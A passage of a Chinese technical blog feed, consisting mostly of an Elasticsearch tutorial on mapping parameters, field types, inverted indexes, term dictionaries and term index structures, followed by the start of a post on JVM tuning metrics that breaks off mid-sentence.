。但是会增加索引大小</td></tr><tr><td>norms</td><td>norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false</td></tr><tr><td>null_value</td><td>一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引</td></tr><tr><td>position_increment_gap</td><td>增加近似值匹配</td></tr><tr><td>properties</td><td>定义类型映射、对象字段和嵌套字段等数据</td></tr><tr><td>search_analyzer</td><td>定义此字段查询时使用的分词方式</td></tr><tr><td>similarity</td><td>此参数可以配置用来计算字段相似性的算法</td></tr><tr><td>store</td><td>默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。</td></tr><tr><td>term_vector</td><td>术语向量的定义，存储一些术语向量，以便可以为特定文档检索它们</td></tr><tr><td>index</td><td>控制字段是否可以被索引，被设置为false的字段无法被索引到</td></tr><tr><td>fields</td><td>此参数可以为同一个字段设置不同的索引方式，但是在_source字段中只会保存一份，并不会实际增加存储。但是会增加索引大小</td></tr><tr><td>norms</td><td>norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false</td></tr><tr><td>null_value</td><td>一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引</td></tr><tr><td>position_increment_gap</td><td>增加近似值匹配</td></tr><tr><td>properties</td><td>定义类型映射、对象字段和嵌套字段等数据</td></tr><tr><td>search_analyzer</td><td>定义此字段查询时使用的分词方式</td></tr><tr><td>similarity</td><td>此参数可以配置用来计算字段相似性的算法</td></tr><tr><td>store</td><td>默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。</td></tr></tbody></table><ol><li><p><strong>index</strong> 表示字段是否索引。</p></li><li><p><strong>index_options</strong></p></li></ol><p>index_options 控制倒排索引记录的内容，一共有4种配置可选。</p><table><thead><tr><th>index_options</th><th>含义</th></tr></thead><tbody><tr><td>docs</td><td>只记录文档id（ doc id ）</td></tr><tr><td>freqs</td><td>记录 doc id 和 term frequences</td></tr><tr><td>positions</td><td>doc id 、 term frequences 、 term position</td></tr><tr><td>offsets</td><td>doc id 、 term frequences 、 term position 、 character</td></tr><tr><td>offsets</td><td></td></tr></tbody></table><p>文本类型 text 默认的配置是 positions ，其他默认是docs。 需要注意的是，虽然index_options提供了offsets这种内容较多的配置级别，但是记录的内容越多，占用的空间也会越多，在实际操作中还是要根据实际情况进行配置。 例如创建mapping,字段名为user_name，字符串类型。user_name不需要索引,info字段的倒排索引类型为positions。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">PUT mapping\_test3  </span><br><span class="line">&#123;  </span><br><span class="line">    &quot;mappings&quot;: &#123;  </span><br><span class="line">        &quot;properties&quot;: &#123;  </span><br><span class="line">            &quot;user\_name&quot;: &#123;  </span><br><span class="line">                &quot;index&quot;: false,  </span><br><span class="line">                &quot;type&quot;: &quot;text&quot;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            &quot;info&quot;: &#123;  </span><br><span class="line">                &quot;index\_options&quot;: &quot;positions&quot;,  </span><br><span class="line">                &quot;type&quot;: &quot;text&quot;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            &quot;doc&quot;: &#123;  </span><br><span class="line">                &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                &quot;index\_options&quot;: &quot;docs&quot;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            &quot;freq&quot;: &#123;  </span><br><span class="line">                &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                &quot;index\_options&quot;: &quot;freqs&quot;  </span><br><span class="line">            &#125;,  </span><br><span class="line">            &quot;offset&quot;: &#123;  </span><br><span class="line">                &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                &quot;index\_options&quot;: &quot;offsets&quot;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>ANALYZER</strong> 分词器。es有内置的分词器，也可以使用第三方的分词工具。如IK。</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">    &quot;mappings&quot;: &#123;  </span><br><span class="line">        &quot;my\_type&quot;: &#123;  </span><br><span class="line">            &quot;properties&quot;: &#123;  </span><br><span class="line">                &quot;content&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                    &quot;analyzer&quot;: &quot;ik\_max\_word&quot;,//写入是的分词器  </span><br><span class="line">                    &quot;search\_analyzer&quot;: &quot;ik\_max\_word&quot;//搜索时的分词器  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>COPY_TO</strong></li></ol><p>允许将一个或者多个字段的值复制到某一个字段中。用来满足一些搜索需要，类似于数据库 title like “%a%” or title2 like “%a%” copy_to的字段不会出现在_source里面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">    &quot;mappings&quot;: &#123;  </span><br><span class="line">        &quot;my\_type&quot;: &#123;  </span><br><span class="line">            &quot;properties&quot;: &#123;  </span><br><span class="line">                &quot;first\_name&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                    &quot;copy\_to&quot;: &quot;full\_name&quot;  </span><br><span class="line">                &#125;,  </span><br><span class="line">                &quot;last\_name&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                    &quot;copy\_to&quot;: &quot;full\_name&quot;  </span><br><span class="line">                &#125;,  </span><br><span class="line">                &quot;full\_name&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;text&quot;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">PUT my\_index/my\_type/1  </span><br><span class="line">&#123;  </span><br><span class="line">    &quot;first\_name&quot;: &quot;John&quot;,  </span><br><span class="line">    &quot;last\_name&quot;: &quot;Smith&quot;  </span><br><span class="line">&#125;   </span><br><span class="line">//full\_name = \[&quot;John&quot;,&quot;Smith&quot;\]  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li><strong>DOC_VALUES</strong></li></ol><p>为了加快排序、聚合操作，在建立倒排索引的时候，额外增加一个列式存储映射，是一个空间换时间的做法。 默认是开启的，对于确定不需要聚合或者排序的字段可以关闭。 注意：text类型没有doc_values。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">    &quot;mappings&quot;: &#123;  </span><br><span class="line">        &quot;my\_type&quot;: &#123;  </span><br><span class="line">            &quot;properties&quot;: &#123;  </span><br><span class="line">                &quot;status\_code&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;keyword&quot;  </span><br><span class="line">                &#125;,  </span><br><span class="line">                &quot;session\_id&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class="line">                    &quot;doc\_values&quot;: false  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="6"><li><strong>ENABLED</strong></li></ol><p>enabled默认为true,将搜索所有字段。如果设置为false，该字段将不会被搜索。但仍会随着_source返回</p><ol start="7"><li><strong>FIELDDATA</strong></li></ol><p>对非text类型的字段进行排序可以使用doc_value来进行加速。但是对于，text类型的字段，却不能进行分组排序。更何况加速。 下面这个异常展示了，对text类型的字段进行分组排序的错误。<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/27.png"><br>但是可以通过设置fielddata值来达到这一目的。它将字段加载到内存中，因此第一次肯定会很慢。而且将占用内存。</p><ol start="8"><li><strong>FORMAT</strong></li></ol><p>对字段进行格式化。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">    &quot;mappings&quot;: &#123;  </span><br><span class="line">        &quot;my\_type&quot;: &#123;  </span><br><span class="line">            &quot;properties&quot;: &#123;  </span><br><span class="line">                &quot;date&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;date&quot;,  </span><br><span class="line">                    &quot;format&quot;: &quot;yyyy-MM-dd&quot;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="9"><li><strong>IGNORE_ABOVE</strong></li></ol><p>大小超过ignore_above设置的字符串不会被索引或存储。</p><ol start="10"><li>FIELDS</li></ol><p>可以为一个字段映射多个数据类型。比如，一个字符串，可以映射为text，满足全文搜索。同时可以映射为keyword,满足分组和排序。 也可以使用多个分词器来对同一个字段进行分词。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">    &quot;mappings&quot;: &#123;  </span><br><span class="line">        &quot;my\_type&quot;: &#123;  </span><br><span class="line">            &quot;properties&quot;: &#123;  </span><br><span class="line">                &quot;city&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                    &quot;fields&quot;: &#123;  </span><br><span class="line">                        &quot;raw&quot;: &#123;  </span><br><span class="line">                            &quot;type&quot;: &quot;keyword&quot;  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="11"><li><strong>STORE</strong></li></ol><p>我们知道，source字段存储了原始数据(默认)。当然可以通过设置其属性值来选择不存储。此外，还可以通过store选择是否额外存储某个字段。store属性默认为no,表示不存储。当设置为yes时，会在source之 外独立存储。此时，搜索时，会绕过_source，单独进行一次IO得到该字段的值。 store会严重影响搜索效率，尽管如此，在以下两种情况下，还是可以选择使用：</p><ul><li><p>字段很长，每次检索_source代价很大。</p></li><li><p>需要单独对某些字段进行索引重建。</p></li></ul><h2 id="7-4-ES中常见数据类型"><a href="#7-4-ES中常见数据类型" class="headerlink" title="7.4 ES中常见数据类型"></a>7.4 ES中常见数据类型</h2><ol><li><strong>字符串</strong></li></ol><p>字符串在之前的版本主要指的是 string 类型。但是在5.X版本已经不支持 string 类型。其被 text 和keyword 类型替代</p><ol start="2"><li><strong>text</strong></li></ol><p>text字段需要被全文搜索的内容，它可以保存非常长的内容。查询的时候一般使用分词器器进⾏行行分词然后进行全文搜索。text类型的字段不用于排序，很少用于聚合。 （text类型的数据被用来索引长文本，例如电子邮件主体部分或者一款产品的介绍，这些文本会被分析，在建立索引文档之前会被分词器进行分词，转化为词组。经过分词机制之后es允许检索到该文本切分而成的词语，但是text类型的数据不能用来过滤、排序和聚合等操作。</p><ol start="3"><li><strong>keyword</strong></li></ol><p>此字段不能使用分词器进行查询，只能搜索该字段的完整的值。所以其主要保存一些可以索引的结构化内容。此字段可以进行排序、聚合等操作。 keyword类型的数据可以满足电子邮箱地址、主机名、状态码、邮政编码和标签等数据的要求，不进行分词，常常被用来过滤、排序和聚合。 综上，可以发现text类型在存储数据的时候会默认进行分词，并生成索引。而keyword存储数据的时候，不会分词建立索引，显然，这样划分数据更加节省内存。）</p><h1 id="8-底层知识：正排索引和倒排索引底层原理"><a href="#8-底层知识：正排索引和倒排索引底层原理" class="headerlink" title="8 底层知识：正排索引和倒排索引底层原理"></a>8 底层知识：正排索引和倒排索引底层原理</h1><h2 id="8-1-什么是正排索引"><a href="#8-1-什么是正排索引" class="headerlink" title="8.1 什么是正排索引"></a>8.1 什么是正排索引</h2><p>正排索引是按照文档编号或文档ID等有序的方式将每个文档存储在索引中，通过文档编号或ID进行检索。</p><p>这种方式类似于数据库表的行，可以很方便地根据文档ID检索到具体的文档，但是不适合处理大规模文档库的情况。</p><h2 id="比如mysql的b-锁索引结构比如书籍目录，可以根据页码找文档内容，就是正排索引8-2-什么是倒排索引"><a href="#比如mysql的b-锁索引结构比如书籍目录，可以根据页码找文档内容，就是正排索引8-2-什么是倒排索引" class="headerlink" title="比如mysql的b+锁索引结构比如书籍目录，可以根据页码找文档内容，就是正排索引8.2 什么是倒排索引"></a>比如mysql的b+锁索引结构<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/28.png"><br>比如书籍目录，可以根据页码找文档内容，就是正排索引<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/29.png"><br>8.2 什么是倒排索引</h2><h2 id="倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。-倒排索引可以理解为Map-item-list-id-，能够由查询词快速（时间复杂度O-1-）找到包含这个查询词的文件的数据结构。比如书籍索引页根据关键词，找页码就是倒排索引8-3-ES如何做到快速索引"><a href="#倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。-倒排索引可以理解为Map-item-list-id-，能够由查询词快速（时间复杂度O-1-）找到包含这个查询词的文件的数据结构。比如书籍索引页根据关键词，找页码就是倒排索引8-3-ES如何做到快速索引" class="headerlink" title="倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。 倒排索引可以理解为Map&lt; item, list&lt; id&gt;&gt;，能够由查询词快速（时间复杂度O(1)）找到包含这个查询词的文件的数据结构。比如书籍索引页根据关键词，找页码就是倒排索引8.3 ES如何做到快速索引"></a>倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。 倒排索引可以理解为Map&lt; item, list&lt; id&gt;&gt;，能够由查询词快速（时间复杂度O(1)）找到包含这个查询词的文件的数据结构。<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/30.png"><br>比如书籍索引页根据关键词，找页码就是倒排索引<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/31.png"><br>8.3 ES如何做到快速索引</h2><p>假设有这么几条数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">| ID | Name | Age | Sex |  </span><br><span class="line">| -- |:------------:| -----:| -----:|  </span><br><span class="line">| 1 | Kate | 24 | Female  </span><br><span class="line">| 2 | John | 24 | Male  </span><br><span class="line">| 3 | Bill | 29 | Male  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ID是Elasticsearch自建的文档id，那么Elasticsearch建立的索引如下: Name：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">| Term | Posting List |  </span><br><span class="line">| -- |:----:|  </span><br><span class="line">| Kate | 1 |  </span><br><span class="line">| John | 2 |  </span><br><span class="line">| Bill | 3 |  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Age：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">| Term | Posting List |  </span><br><span class="line">| -- |:----:|  </span><br><span class="line">| 24 | \[1,2\] |  </span><br><span class="line">| 29 | 3 |  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="8-3-1-Posting-List"><a href="#8-3-1-Posting-List" class="headerlink" title="8.3.1 Posting List"></a>8.3.1 Posting List</h3><p>Elasticsearch分别为每个field都建立了一个倒排索引，</p><ul><li><p>Kate, John, 24, Female这些叫term，</p></li><li><p>而[1,2]就是Posting List。</p></li></ul><p>Posting list就是一个int的数组，存储了所有符合某个term的文档id。 根据id查找的话，通过posting list这种索引方式似乎可以很快进行查找，比如要找age&#x3D;24的同学，在id数组中查找即可。二分查找，但是，如果想通过name来查找呢？</p><h3 id="8-3-2-Term-Dictionary"><a href="#8-3-2-Term-Dictionary" class="headerlink" title="8.3.2 Term Dictionary"></a>8.3.2 Term Dictionary</h3><p>Elasticsearch为了能快速找到某个term，将所有的term排个序，二分法查找term，logN的查找效， 就像通过字典查找一样. 这样我们可以用二分查找的方式，比全遍历更快地找出目标的term。 这个就是 term dictionary。 所以：反向索引分成两部分，如下图(来自《信息检索导论》)：<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/32.png"><br>左面是词项词典(Term Dictionary)，右边是倒排记录表(Posting)。 在Lucene中，词典和倒排是分开存储的，词典存储在.tii和.tis文件中。 而倒排又分为两部分存储，第一部分是文档号和词频信息，存储在.frq中；另一部分是词的位置信息， 存储在.prx文件中。 有了term dictionary之后，可以用 logN 次磁盘查找得到目标。 问题是：现在再看起来，似乎和传统数据库通过B+Tree的方式类似啊，为什么说比B+Tree的查询快？</p><h3 id="8-3-3-Term-Index"><a href="#8-3-3-Term-Index" class="headerlink" title="8.3.3 Term Index"></a>8.3.3 Term Index</h3><p>B-Tree通过<strong>减少磁盘寻道次数</strong>来提高查询性能，Elasticsearch也是采用同样的思路</p><p>但是磁盘的随机读操作仍然是非常昂贵的（一次random access大概需要10ms的时间）。</p><p>所以尽量少的读磁盘，有必要把一些数据缓存到内存里。<strong>Elasticsearch直接通过内存查找term，不读磁盘</strong></p><p>但是整个term dictionary本身又太大了，无法完整地放到内存里。</p><p>于是就有了term index。term index有点像一本字典的大的章节表，或者说，像一本书的目录。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">A开头的term ……………. Xxx页  </span><br><span class="line">C开头的term ……………. Xxx页  </span><br><span class="line">E开头的term ……………. Xxx页  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果所有的term都是英文字符的话，可能这个term index就真的是26个英文字符表构成的了。 但是实际的情况是，term未必都是英文字符，term可以是任意的byte数组。</p><p>而且26个英文字符也未必是每一个字符都有均等的term，比如x字符开头的term可能一个都没有，而s开头的term又特别多。</p><p>实际的term index，的内部结构，类似一棵 trie 树：<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/33.png"><br>例子是一个包含 “A”, “to”, “tea”, “ted”, “ten”, “i”, “in”, 和 “inn” 的 trie 树。 Term Dictionary与Term Index存储，Term Dictionary文件的后缀名为tim，Term Index文件的后缀名是tip。</p><blockquote><p>Lucene为词典做了一层前缀索引(Term Index)，这个索引在Lucene4.0以后采用的数据结构是FST (Finite State Transducer)，一种前缀树的变种，可以称之为前缀索引。</p></blockquote><p>这种数据结构占用空间很小，Lucene打开索引的时候将其全量装载到内存中，加快磁盘上词典查询速度的同时减少随机磁盘访问次数。</p><h3 id="8-3-4-Trie树（前缀树，字典树）"><a href="#8-3-4-Trie树（前缀树，字典树）" class="headerlink" title="8.3.4 Trie树（前缀树，字典树）"></a>8.3.4 Trie树（前缀树，字典树）</h3><p>Trie，又经常叫前缀树，字典树等等。</p><ul><li><p>一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。</p></li><li><p>一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。</p></li></ul><p>trie中的键通常是字符串，但也可以是其它的结构。它有很多变种，如后缀树，Radix Tree&#x2F;Trie，PATRICIA tree，以及bitwise版本的crit-bit tree。</p><p>当然很多名字的意义其实有交叉。 在计算机科学中，trie，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字 符串。</p><p>与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。</p><p>trie的算法可以很容易地修改为处理其它结构的有序序列，比如一串数字或者形状的排列。</p><p>这棵树不会包含所有的 term，它包含的是 term 的一些前缀。</p><p>通过 term index 可以快速地定位到 term dictionary 的某个 offset，然后从这个位置再往后顺序查找。</p><p>再加上一些压缩技术（搜索 Lucene Finite State Transducers）, term index 的尺寸可以只有所有term 的尺寸的<strong>几十分之一</strong>，使得用内存缓存整个 term index 变成可能。整体上来说就是这样的效果：<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/34.png"></p><h3 id="8-3-5-为什么ES检索比Mysql快"><a href="#8-3-5-为什么ES检索比Mysql快" class="headerlink" title="8.3.5 为什么ES检索比Mysql快"></a>8.3.5 为什么ES检索比Mysql快</h3><p>现在我们可以回答<strong>“为什么 Elasticsearch&#x2F;Lucene 检索可以比 Mysql 快”</strong> 了。 Mysql 只有 term dictionary 这一层，是以 b+tree 排序的方式存储在磁盘上的。</p><p>检索一个 term 需要若干次（1-3次）的 random access 的磁盘操作。</p><p>而ES&#x2F; Lucene 在 term dictionary 的基础上添加了 term index 来加速检索，term index 以类似前缀树的形式缓存在内存中。 从 term index 查到对应的 term dictionary 的 block 位置之后，再去磁盘上找 term，大大减少了磁盘的 random access 次数, 将3次 变成了1次。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>JVM如何调优</title>
      
      <link href="/2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/"/>
      <url>/2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/</url>
      
        <content type="html"><![CDATA[<h2 id="一：引言"><a href="#一：引言" class="headerlink" title="一：引言"></a>一：引言</h2><p>在软件开发和运维中，JVM作为执行Java程序的核心引擎，扮演着至关重要的角色。</p><p>随着应用程序的复杂性和负载不断增加，对JVM的性能和稳定性要求也越来越高。</p><p>在此背景下，JVM调优变得至关重要。</p><p>JVM调优涉及到一系列的参数设置、垃圾收集器的选择、内存分配策略等方面，对于提高Java应用程序的性能、减少内存泄漏、降低系统崩溃风险都有重要作用。</p><p>另外，在大厂面试中，JVM调优的知识也是备受关注的考察点，因为它直接关系到系统的稳定性和性能优化。</p><p>候选人对JVM调优的理解和实践能力，可以反映其在Java虚拟机运行机制方面的深度和广度，</p><p>需要注意的是，调优并非首选方法，一般而言，解决性能问题的第一步是优化程序本身，只有在必要时才考虑进行JVM调优。</p><h2 id="JVM调优，有什么好处？"><a href="#JVM调优，有什么好处？" class="headerlink" title="JVM调优，有什么好处？"></a>JVM调优，有什么好处？</h2><p>JVM调优目的是通过调整Java虚拟机的配置参数、垃圾回收策略和内存分配等手段，提升Java应用程序的性能、稳定性和可靠性。</p><p>随着应用规模和用户量的增长，原始的JVM配置可能无法满足业务需求，因此必须进行调优以确保系统的正常运行。</p><p>然而，并不是所有异常情况都需要进行JVM调优。</p><p>在实际情况中，大多数问题可以通过分析JVM日志文件和业务逻辑来定位，并通过业务层面的优化来解决。</p><p>尽管如此，深入了解各项参数和指标仍然至关重要，因为它们有助于更快速地理解和解决问题，调优能带来什么好处？</p><ul><li><p><strong>性能层面：</strong></p><p>通过调整JVM参数和优化垃圾回收机制，能够提高Java应用程序的性能，减少延迟，提升系统响应速度和并发能力、和吞吐量。</p></li><li><p><strong>资源利用：</strong></p><p>合理配置JVM资源，包括内存、CPU等，能够有效地利用硬件资源，提高系统的资源利用率，降低成本。</p></li><li><p><strong>稳定性：</strong> 通过调优JVM，可减少内存泄漏、OOM（Out of Memory）等问题的发生，提高系统的稳定性和可靠性，降低系统崩溃的风险。</p></li></ul><h2 id="二：JVM调优的关注哪些指标？"><a href="#二：JVM调优的关注哪些指标？" class="headerlink" title="二：JVM调优的关注哪些指标？"></a>二：JVM调优的关注哪些指标？</h2><p>调优，到底调的是什么？</p><p>调优之前，要搞清楚一个问题：怎样才算是“优”。</p><p>如何定性？</p><p>如何定量？</p><p>到底需要其实是需要关注几个关键的指标，以全面评估系统的运行状态和性能表现。</p><p>需要有一个具体的指标来衡量性能情况，而在JVM里面衡量性能的两个核心指标分别“吞吐量”和“停顿时间”。</p><h3 id="核心指标1：吞吐量-throughput-："><a href="#核心指标1：吞吐量-throughput-：" class="headerlink" title="核心指标1：吞吐量(throughput)："></a>核心指标1：吞吐量(throughput)：</h3><p>程序运行过程中执行两种任务，分别是执行业务代码的 任务 和进行垃圾回收的任务，</p><p>吞吐量大，意就是说程序运行业务代码的时间越多， 换句话说，执行业务任务越多， 吞吐量就越高，</p><p>吞吐量计算公式 ，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">吞吐量 = CPU在用户应用程序运行的时间 / （CPU在用户应用程序运行的时间 + CPU垃圾回收的时间），  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在实践中我们发现对于大多数的应用领域，评估一个垃圾收集(GC)算法如何，有如下一个核心标准：</p><ul><li>吞吐量越高越好</li></ul><p>一般而言GC 的吞吐量不能低于 95%。</p><p>本质上，吞吐量是指应用程序线程用时占程序总用时的比例。</p><p>例如，吞吐量99&#x2F;100， 意味着100秒的程序执行时间，应用程序线程运行了99秒， 而在这一时间段内GC线程只运行了1秒。</p><h3 id="核心指标2：停顿时间-pause-times-："><a href="#核心指标2：停顿时间-pause-times-：" class="headerlink" title="核心指标2：停顿时间(pause times)："></a>核心指标2：停顿时间(pause times)：</h3><p>JVM在专门的线程(GC threads)中执行GC。</p><p>因为JVM进行垃圾回收的时候，某些阶段必须要停止业务线程专心进行垃圾收集， 只要GC线程是活动的，它们将与应用程序线程(application threads)争用当前可用CPU的时钟周期。</p><p>停顿时间(pause times) 是指一个时间段内应用程序线程让与GC线程执行，而应用程序线程完全暂停。</p><p>例如，GC期间100毫秒的停顿时间， 意味着在这100毫秒期间内没有应用程序线程是活动的。</p><p>如果说一个正在运行的应用程序有100毫秒的“平均停顿时间”，那么就是说该应用程序所有的停顿时间平均长度为100毫秒。</p><p>同样，100毫秒的“最大停顿时间”是指：该应用程序所有的停顿时间最大不超过100毫秒。</p><p>注意，这里说的JVM停顿时间，就是指JVM停止业务线程而去进行垃圾收集的这段时长，其实指的是<strong>每次GC造成用户线程停顿的平均时间</strong>，不是总的垃圾回收时间。</p><p>停顿时间越长，就意味着GC场景下，用户线程平均等待的时间越长，停顿时间会直接影响用户使用系统的体验。</p><p>除了吞吐量(throughput) 、停顿时间(pause times) 两个核心指标，JVM调优还会关心下面的非核心指标：</p><h3 id="核心指标3：堆内存占用量："><a href="#核心指标3：堆内存占用量：" class="headerlink" title="核心指标3：堆内存占用量："></a>核心指标3：堆内存占用量：</h3><p>细致监控堆内存使用量、非堆内存使用量以及永久代（或元空间）使用量指标数据。</p><p>举例来说，当堆内存使用量持续增加，而内存回收频率较低时，可能暗示着潜在的内存泄漏问题，这可能导致系统性能下降或者最终的内存耗尽（OOM）。</p><h3 id="非核指标1：垃圾回收次数"><a href="#非核指标1：垃圾回收次数" class="headerlink" title="非核指标1：垃圾回收次数"></a>非核指标1：垃圾回收次数</h3><p>GC非常占用CPU资源的，如果GC占用的资源越多，那么意味着其他事情所用的资源会减少，系统所能做的事情也会越少。</p><p>尽管垃圾回收过程会消耗大量的CPU资源，但是我们也不能单纯地、一味的追求GC次数减少</p><p>为啥? GC次数减少了，有可能单次GC的时间变长，那么就可能会增加单次GC的“停顿时长”（核心指标2），</p><h3 id="非核指标2：垃圾回收频率"><a href="#非核指标2：垃圾回收频率" class="headerlink" title="非核指标2：垃圾回收频率"></a>非核指标2：垃圾回收频率</h3><p>通常情况下，与垃圾回收次数相比，较低的垃圾回收频率被认为是更好的选择。</p><p>垃圾回收的频率,需要适中</p><ul><li><p>频率过小,每次垃圾回收的时间会过长</p></li><li><p>频率过大,停顿时间长,延迟高</p></li></ul><p>所以：通常来说垃圾回收频率是越低越好。</p><p>详细记录GC频率、GC停顿时间以及每次GC后的内存情况。</p><p>或者说：减少 